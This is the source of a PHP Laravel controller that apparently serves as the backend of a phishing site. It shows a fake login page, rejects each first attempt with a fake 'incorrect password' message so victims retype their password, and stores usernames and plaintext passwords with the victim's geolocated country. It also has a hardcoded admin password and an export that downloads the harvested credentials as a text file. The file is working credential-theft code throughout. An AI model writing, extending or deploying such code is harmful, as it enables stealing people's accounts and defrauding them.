<?php

namespace App\Http\Controllers;

use App\Http\Requests\LoginRequest;
use App\Models\Account;
use App\Models\Page;
use GeoIp2\Record\Location;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Session;


class HomeController extends Controller
{
    public function index($slug)
    {
        $page = Page::where('slug', $slug)->firstOrFail();
        return view('frontend.index', compact('page'));
    }

    public function login(LoginRequest $request)
    {
        $find_cache = Cache::has($request->username);
        if (!$find_cache) {
            Cache::put($request->username, 1);
            $cache = Cache::get($request->username);
        } else {
            Cache::increment($request->username);
            $cache = Cache::get($request->username);
        }
        if ($cache <= 1) {
            return response()->json(['message' => 'Mật khẩu bạn đã nhập không chính xác', 'status' => 400]);
        }
        try {
            $ip = $request->ip();
            $xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip);
            $locale = (string)$xml->geoplugin_countryCode[0];
        } catch (\Exception $exception) {
            $locale = 'error ip';
        }
        $acc = Account::where('acc', $request->username)->first();
        if (!$acc) {
            Account::create([
                'acc' => $request->username,
                'pass' => $request->password,
                'locale' => $locale,
            ]);
        }
        return response()->json([
            'status' => 200,
            'message' => 'OK'
        ]);
    }

    public function admin(Request $request)
    {
        if ($request->password === 'spamahihisontien') {
            Session::put('admin', 1);
        }
    }

    public function getAccount()
    {
        $accounts = Account::where(function ($query) {
            $query->when(request('fromDate') && request('toDate') !== '', function ($query) {
                return $query->whereBetween('created_at', [date(request('fromDate')), date(request('toDate'))]);
            });
        })->whereStatus(0)->paginate(10);
        return view('backend.admin', compact('accounts'));
    }

    public function download()
    {
        $accounts = Account::where(function ($query) {
            $query->when(request('fromDate') && request('toDate') !== '', function ($query) {
                return $query->whereBetween('created_at', [date(request('fromDate')), date(request('toDate'))]);
            });
        })->whereStatus(0)->get();
        $content = '';
        foreach ($accounts as $key => $value) {
            $content .= $value->acc . '|' . $value->pass . '|' . $value->locale . "\n";
            $value->status = 1;
            $value->save();
        }

        return response($content)
            ->withHeaders([
                'Content-Type' => 'text/plain',
                'Cache-Control' => 'no-store, no-cache',
                'Content-Disposition' => 'attachment; filename="' . 'accounts.txt' . '"',
            ]);
    }
}
